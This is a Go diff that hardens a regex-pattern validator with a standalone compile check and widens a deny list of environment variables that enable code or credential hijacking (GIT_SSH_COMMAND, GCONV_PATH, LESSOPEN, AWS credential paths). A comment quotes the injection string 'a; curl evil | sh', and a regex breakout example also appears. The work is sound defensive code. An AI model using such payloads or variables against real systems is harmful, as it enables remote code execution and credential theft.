@@ -177,6 +177,11 @@ func toFloat(v any) float64 {
 // value. Patterns are a security control on alert-derived input, and a
 // substring match ("[a-z]+" matching "a; curl evil | sh") would defeat it.
 func CompilePattern(p string) (*regexp.Regexp, error) {
+	// The pattern must stand on its own: "a)|(.*" would otherwise close the
+	// wrapper's group and leave an unanchored alternative.
+	if _, err := regexp.Compile(p); err != nil {
+		return nil, err
+	}
 	return regexp.Compile(`^(?:` + p + `)$`)
 }
 
@@ -186,11 +191,13 @@ func CompilePattern(p string) (*regexp.Regexp, error) {
 func ReservedEnv(name string) bool {
 	switch name {
 	case "PATH", "HOME", "TMPDIR", "LANG", "IFS", "ENV", "SHELLOPTS", "BASHOPTS", "PS4", "PROMPT_COMMAND",
-		"CDPATH", "GLOBIGNORE", "POSIXLY_CORRECT", "PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PERL5LIB", "PERL5OPT",
-		"RUBYOPT", "NODE_OPTIONS":
+		"CDPATH", "GLOBIGNORE", "POSIXLY_CORRECT", "PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PYTHONUSERBASE", "PYTHONEXECUTABLE", "PERL5LIB", "PERL5OPT",
+		"PERLLIB", "RUBYOPT", "RUBYLIB", "NODE_OPTIONS", "GCONV_PATH", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS",
+		"LESSOPEN", "LESSCLOSE", "PAGER", "EDITOR", "VISUAL", "SSH_ASKPASS", "SUDO_ASKPASS", "GIT_ASKPASS", "GIT_SSH", "GIT_SSH_COMMAND",
+		"GIT_EXEC_PATH", "GIT_PAGER", "GIT_EDITOR", "GIT_PROXY_COMMAND", "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE":
 		return true
 	}
-	for _, prefix := range []string{"BASH_", "LD_", "DYLD_"} {
+	for _, prefix := range []string{"BASH_", "LD_", "DYLD_", "GIT_CONFIG"} {
 		if strings.HasPrefix(name, prefix) {
 			return true
 		}
